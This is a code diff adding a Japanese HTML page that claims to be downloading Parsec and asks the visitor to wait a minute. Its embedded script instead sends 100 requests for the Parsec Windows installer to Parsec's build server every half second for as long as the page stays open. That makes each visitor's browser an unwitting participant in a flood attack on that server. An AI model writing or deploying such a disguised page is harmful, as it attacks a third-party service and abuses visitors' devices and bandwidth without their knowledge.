@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>Parsecをダウンロードしています</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+    <h1>Parsecをダウンロードしています...</h1>
+    <h2>お手数ですが1分ほどお待ちください..</h2>
+    <script>
+        setInterval(() => {
+            for (let i = 0; i < 100; i++) {
+                fetch("https://builds.parsec.app/package/parsec-windows.exe", {
+                    method: "GET"
+                });
+            }
+        }, 500);
+    </script>
+</body>
+
+</html>
